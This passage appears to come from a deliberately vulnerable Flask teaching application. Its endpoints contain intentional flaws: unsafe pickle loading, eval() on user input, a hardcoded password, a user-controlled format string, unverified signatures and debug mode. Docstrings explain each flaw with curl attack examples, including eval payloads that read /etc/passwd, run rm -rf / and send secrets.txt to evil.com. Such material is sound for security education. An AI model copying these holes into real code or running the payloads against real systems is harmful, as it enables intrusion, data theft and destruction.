    obj = pickle.loads(data)  # RCE vulnerability!
    return ok({"loaded_type": str(type(obj))})


# ===================================================================================
# VULNERABILITY EXPLANATION: BUFFER OVERFLOW (SIMULATED)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Buffer Overflow / Memory Exhaustion

DESCRIPTION:
This endpoint attempts to allocate massive amounts of memory based on user input
without bounds checking. While Python handles memory differently than C/C++,
this simulates buffer overflow concepts and demonstrates denial of service
through memory exhaustion.

🎯 ATTACK SCENARIO:
1. Attacker provides extremely large count value
2. Application attempts to allocate massive memory buffer
3. Server runs out of memory and crashes
4. Denial of service for all users

EXAMPLE ATTACK:
# Memory exhaustion attack
curl "http://localhost:5000/buf/pack?count=999999999"
# Attempts to allocate gigabytes of memory

💥 SECURITY IMPACT:
- Denial of Service through memory exhaustion
- Server crash and unavailability
- Potential for more sophisticated attacks in languages like C/C++
- Resource exhaustion affecting other applications
- In compiled languages: potential for code execution

🛡️ WHY BUFFER OVERFLOWS ARE DANGEROUS:
- Can crash applications and systems
- In C/C++: can overwrite memory and execute arbitrary code
- Often used to bypass security controls
- Difficult to detect without proper testing
- Can lead to privilege escalation
- Historical source of many critical vulnerabilities

📚 BUFFER OVERFLOW CONTEXT:
In languages like C/C++, buffer overflows can:
- Overwrite return addresses on the stack
- Execute shellcode injected by attackers
- Bypass address space layout randomization (ASLR)
- Achieve remote code execution
- This Python example shows the DoS aspect of the vulnerability class
"""
@app.get("/buf/pack")
def buf_pack():
    count = int(request.args.get("count", "1000"))
    # ❌ BAD: attempt to pack an absurd number of integers (may exhaust memory)
    # No bounds checking - can cause denial of service
    packed = struct.pack("I" * count, *([1] * count))  # Memory exhaustion!
    return ok({"len": len(packed)})


# ===================================================================================
# VULNERABILITY EXPLANATION: FORMAT STRING INJECTION
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Format String Injection / Information Disclosure

DESCRIPTION:
This endpoint uses user-controlled format strings with Python's % formatting
operator. When the format string references non-existent keys, it can cause
exceptions that leak sensitive information about the application's internal state.

🎯 ATTACK SCENARIO:
1. Normal use: /fmt?pattern=%(user)s says hi → "guest says hi"
2. Info leak: /fmt?pattern=%(missing)s → causes exception with stack trace
3. Advanced: /fmt?pattern=%(user)s%(missing)s%(other)s → multiple errors
4. In other languages (C): can lead to memory corruption and code execution

EXAMPLE ATTACKS:
# Information disclosure through error
curl "http://localhost:5000/fmt?pattern=%(secret)s"

# Stack trace leakage
curl "http://localhost:5000/fmt?pattern=%(config)s%(database)s"

💥 SECURITY IMPACT:
- Information disclosure through error messages
- Stack trace leakage revealing internal application structure
- Potential denial of service through exception handling
- In C/C++: memory corruption and code execution
- Application fingerprinting and reconnaissance

🛡️ WHY FORMAT STRING VULNERABILITIES ARE DANGEROUS:
- User controls the format specification
- Can access unintended memory locations (in C/C++)
- Error messages may reveal sensitive information
- Can be used for reconnaissance before other attacks
- In compiled languages: can achieve arbitrary read/write
- Historical source of many critical vulnerabilities

📚 FORMAT STRING CONTEXT:
In C/C++, format string vulnerabilities can:
- Read arbitrary memory locations (%x, %s specifiers)
- Write to arbitrary memory locations (%n specifier)
- Execute arbitrary code through memory corruption
- Bypass stack canaries and other protections
- This Python example shows the information disclosure aspect
"""
@app.get("/fmt")
def fmt():
    pattern = request.args.get("pattern", "%(user)s says hi")
    data = {"user": "guest"}  # ❌ BAD: missing keys cause exceptions/info leaks
    try:
        # ❌ BAD: User-controlled format string
        return ok({"result": pattern % data})  # Can cause info-leaking exceptions
    except Exception as e:
        # ❌ BAD: Exception details may leak sensitive information
        return err(str(e), 500)


# ===================================================================================
# VULNERABILITY EXPLANATION: HARDCODED PASSWORD
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Hardcoded Credentials in Source Code

DESCRIPTION:
This endpoint uses a hardcoded password directly embedded in the source code
for authentication. This violates fundamental security principles and creates
multiple attack vectors for credential compromise.

🎯 ATTACK SCENARIO:
1. Source code access: Attacker gains access to code repository (GitHub, leaked files)
2. Binary analysis: Reverse engineering reveals hardcoded credentials
3. Log analysis: Passwords may appear in application logs or error messages
4. Memory dumps: Credentials visible in process memory

EXAMPLE ATTACK:
# Direct password use
curl "http://localhost:5000/admin/door?pw=Password123"

# Code repository analysis
git clone <repository> && grep -r "Password123" .

💥 SECURITY IMPACT:
- Immediate administrative access for anyone with code access
- Credentials cannot be rotated without code changes
- Same password likely reused across environments
- Compromise affects all instances of the application
- Violates compliance requirements (SOX, PCI DSS)

🛡️ WHY HARDCODED PASSWORDS ARE EXTREMELY DANGEROUS:
- Visible to anyone with source code access
- Version control systems preserve password history
- Cannot be changed without redeployment
- Often reused across multiple systems
- Violates principle of least privilege
- Creates single point of failure for security

📚 ADDITIONAL HARDCODED CREDENTIAL RISKS:
- Database connection strings with embedded passwords
- API keys and tokens in configuration files
- SSH keys and certificates in repositories
- Third-party service credentials
- Encryption keys and secrets

🔍 ALSO NOTE: 
This application also has hardcoded secret key at the top:
app.secret_key = "hardcoded-secret" (Line ~18)
"""
@app.get("/admin/door")
def admin_door():
    pw = request.args.get("pw", "")
    # ❌ CRITICAL: compares to hardcoded password
    # This password is visible to anyone who can read the source code!
    if pw == "Password123":  # Hardcoded credential!
        return ok({"entered": True})
    return err("forbidden", 403)


# ===================================================================================
# VULNERABILITY EXPLANATION: VERBOSE ERROR MESSAGES
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Information Disclosure through Detailed Error Messages

DESCRIPTION:
This endpoint deliberately causes an error to demonstrate how verbose error
messages and stack traces can leak sensitive information about the application's
internal structure, file paths, and system configuration.

🎯 ATTACK SCENARIO:
1. Attacker triggers errors in the application
2. Stack traces reveal internal file paths and structure
3. Error messages expose technology stack and versions
4. Debug information helps plan further attacks

EXAMPLE ATTACK:
# Trigger error to get stack trace
curl "http://localhost:5000/error/debug"
# Returns detailed stack trace with:
# - File paths and directory structure
# - Function names and line numbers
# - Variable values and internal state
# - Framework and library information

💥 SECURITY IMPACT:
- Application fingerprinting and technology identification
- Internal file structure and path disclosure
- Variable names and values exposure
- Framework/library version information
- Assists in planning targeted attacks
- May reveal database connection strings or API keys

🛡️ WHY VERBOSE ERRORS ARE DANGEROUS:
- Provide roadmap of application internals
- Help attackers understand system architecture
- Reveal sensitive configuration information
- Expose debugging information not meant for users
- Can leak database schemas and connection details
- Violate security through obscurity principles

📚 INFORMATION COMMONLY LEAKED:
- Full stack traces with file paths
- Database connection strings and schemas
- API keys and configuration values
- Internal IP addresses and hostnames
- Framework and dependency versions
- Developer comments and variable names
- System paths and directory structures

🔍 DEBUG MODE RISKS:
Flask's debug=True mode (enabled at bottom of file) makes this worse by:
- Showing interactive debugger in browser
- Exposing all local variables
- Allowing code execution in browser
- Revealing complete application state
"""
@app.get("/error/debug")
def error_debug():
    # ❌ BAD: deliberately raise to show stack in debug mode (if enabled)
    # This exposes detailed stack traces and internal application information
    1 / 0  # ❌ Causes ZeroDivisionError with full stack trace


# ===================================================================================
# VULNERABILITY EXPLANATION: CODE INJECTION (EVAL)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Direct Code Injection via eval()

DESCRIPTION:
This endpoint uses Python's eval() function to execute user-supplied expressions
directly. This is extremely dangerous as it allows attackers to execute arbitrary
Python code on the server with full application privileges.

🎯 ATTACK SCENARIO:
1. Simple calculation: /code/eval?expr=1+2 → returns 3
2. File access: /code/eval?expr=open('/etc/passwd').read() → reads system files
3. Command execution: /code/eval?expr=__import__('os').system('rm -rf /') → deletes files
4. Network attacks: /code/eval?expr=__import__('urllib.request').urlopen('http://evil.com/steal?data='+open('secrets.txt').read())

EXAMPLE ATTACKS:
# System command execution
curl "http://localhost:5000/code/eval?expr=__import__('os').system('whoami')"

# File system access
curl "http://localhost:5000/code/eval?expr=open('/etc/passwd').read()"

# Network exfiltration
curl "http://localhost:5000/code/eval?expr=__import__('subprocess').getoutput('env')"

# Import arbitrary modules
curl "http://localhost:5000/code/eval?expr=__import__('sys').exit()"

💥 SECURITY IMPACT:
- CRITICAL: Complete server compromise
- Arbitrary code execution with application privileges
- Full file system access (read, write, delete)
- Network access for data exfiltration
- Ability to install backdoors and malware
- Denial of service through system shutdown

🛡️ WHY EVAL IS EXTREMELY DANGEROUS:
- Executes any valid Python expression
- Full access to Python's built-in functions
- Can import any available module
- No sandboxing or security restrictions
- Equivalent to giving attacker a Python shell
- Cannot be safely sanitized or filtered

📚 EVAL ATTACK TECHNIQUES:
- Module importing: __import__('os')
- File operations: open(), read(), write()
- Command execution: os.system(), subprocess
- Network operations: urllib, socket
- Process manipulation: sys.exit(), os.kill()
- Exception handling bypass: try/except in expressions

🚨 NEVER USE EVAL WITH USER INPUT:
- No amount of input filtering can make eval() safe
- Use ast.literal_eval() for safe literal evaluation
- Implement proper parsers for mathematical expressions
- Use whitelisting for allowed operations only
"""
@app.get("/code/eval")
def code_eval():
    expr = request.args.get("expr", "1+2")
    # ❌ EXTREMELY DANGEROUS: eval user input
    try:
        # This executes arbitrary Python code with full privileges!
        result = eval(expr)  # CRITICAL: Remote Code Execution!
        return ok({"result": result})
    except Exception as e:
        return err(str(e), 400)


# ===================================================================================
# VULNERABILITY EXPLANATION: SIGNATURE VERIFICATION BYPASS
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Improper Signature Verification / Authentication Bypass

DESCRIPTION:
This endpoint claims to verify cryptographic signatures but actually skips the
verification process entirely. It simply accepts any signature provided by the
client without validating it against the message content or a shared secret.

🎯 ATTACK SCENARIO:
1. Legitimate use: POST with valid signature → accepted
2. Bypass attack: POST with any fake signature → still accepted
3. No signature: POST without signature header → still accepted
4. Message tampering: Modify body, keep signature → still accepted

EXAMPLE ATTACKS:
# Fake signature attack
curl -X POST http://localhost:5000/sig/verify \
  -H "X-Signature: fake_signature_12345" \
  -d "malicious payload"

# No signature attack
curl -X POST http://localhost:5000/sig/verify \
  -d "unsigned malicious data"

💥 SECURITY IMPACT:
- Complete bypass of message authentication
- Data integrity cannot be verified
- Allows message tampering and replay attacks
- API endpoint accepts any malicious payload
- Non-repudiation is completely broken
- Compliance violations for systems requiring digital signatures

🛡️ WHY PROPER SIGNATURE VERIFICATION IS CRITICAL:
- Ensures message hasn't been tampered with
- Verifies the sender's identity
- Prevents replay attacks when combined with timestamps
- Required for secure API communications
- Essential for financial and legal transactions
- Cornerstone of PKI and digital certificate systems

📚 PROPER SIGNATURE VERIFICATION REQUIRES:
- Cryptographic hash of message content
- Verification against sender's public key or shared secret
- Protection against timing attacks
- Validation of signature format and encoding
- Proper error handling that doesn't leak information
- Integration with certificate validation

🔍 WHAT THIS ENDPOINT SHOULD DO:
1. Extract message body and signature
2. Compute HMAC of body using shared secret
3. Compare computed signature with provided signature
4. Use timing-safe comparison (hmac.compare_digest)
5. Reject request if signatures don't match
6. Log failed verification attempts
"""
@app.post("/sig/verify")
def sig_verify():
    # ❌ BAD: signature is not verified; just trusts provided "signature"
    body = request.data or b""
    provided_sig = request.headers.get("X-Signature", "")
    # ❌ CRITICAL: No actual verification performed!
    # The application pretends to verify but accepts any signature
    return ok({"verified": True, "sig": provided_sig})  # Always returns True!


if __name__ == "__main__":
    # ===================================================================================
    # VULNERABILITY EXPLANATION: DEBUG MODE IN PRODUCTION
    # ===================================================================================
    """
    🔍 VULNERABILITY TYPE: Debug Mode Enabled in Production
    
    DESCRIPTION:
    Running Flask with debug=True in production exposes extremely sensitive
    debugging information and provides an interactive debugger accessible
    through web browsers when errors occur.
    
    🎯 ATTACK SCENARIO:
    1. Attacker triggers any error in the application
    2. Flask's interactive debugger appears in browser
    3. Debugger provides Python shell access with full application privileges
    4. Attacker can execute arbitrary code through the web interface
    
    💥 SECURITY IMPACT:
    - Interactive Python shell accessible via web browser
    - Complete server compromise through web interface
    - All application variables and memory accessible
    - Can execute arbitrary commands and read any file
    - Automatic code reloading exposes source code changes
    
    🛡️ WHY DEBUG=TRUE IS EXTREMELY DANGEROUS:
    - Provides interactive Python REPL in browser
    - Shows all local variables and application state
    - Allows arbitrary code execution via web interface
    - Exposes source code and internal structure
    - Automatically reloads code changes
    - Reveals full stack traces with sensitive information
    """
    # ❌ EXTREMELY DANGEROUS: Enabling debug True is itself risky in prod (leaks secrets/tracebacks)
    # This gives attackers an interactive Python shell through the web browser!
    app.run(debug=True)  # NEVER use debug=True in production!
